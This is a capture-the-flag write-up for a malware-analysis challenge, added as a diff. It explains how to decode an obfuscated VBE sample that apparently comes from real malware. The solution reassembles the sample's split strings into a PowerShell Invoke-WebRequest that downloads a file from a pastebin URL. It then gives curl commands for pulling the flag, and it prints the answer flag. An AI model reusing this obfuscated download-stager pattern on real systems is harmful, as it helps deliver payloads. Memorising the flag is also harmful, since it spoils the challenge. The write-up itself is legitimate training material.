@@ -1,0 +1,33 @@
+Challenge: VeeBeeEee
+Category: Malware
+Difficulty: easy
+Author: @JohnHammond
+Description: While investigating a host, we found this strange file attached to a scheduled task. It was invoked with wscript or something... can you find a flag?
+
+NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
+
+Download the file(s) below.
+
+Attachments: veebeeeee
+
+Solution:
+
+1. rename veebeeeee file.vbe
+2. Decode with VBE-Decoder: git clone https://github.com/JohnHammond/vbe-decoder.git
+3. Open decoded file with sublime text (or another texteditor) and find/remove the following
+	a. '''''''''''''''al37ysoeopm'al37ysoeopm
+	b. &
+4. Assemble the request lines
+	a. Reqest0 = "if (!(Test-Path $f)){Invoke-WebRequest '"'
+	   Reqest1 = "https://past"'
+	   Reqest2 = "ebin.com/raw"'
+	   Reqest3 = "/SiYGwwcz"'
+	   Reqest4 = "' -ou"'
+ 	   Reqest5 = "tfile $f  };"'
+	   Reqest = Reqest0 + Reqest1 + Reqest2 +  Reqest3 + Reqest4 + Reqest5'
+    b. Invoke-WebRequest https://pastebin.com/raw/SiYGwwcz"
+5. Execute PS, use CURL or navigate to page
+	a. (Invoke-WebRequest https://pastebin.com/raw/SiYGwwcz).Content | Select-String -Pattern 'flag{(.*?)}' -AllMatches | ForEach-Object { "flag{$($_.Matches.Groups[1].Value)}" }
+	b. curl -sL https://pastebin.com/raw/SiYGwwcz | grep -oE flag{.*} --color=none
+	c. https://pastebin.com/raw/SiYGwwcz
+6. Flag: flag{ed81d24958127a2adccfb343012cebff}
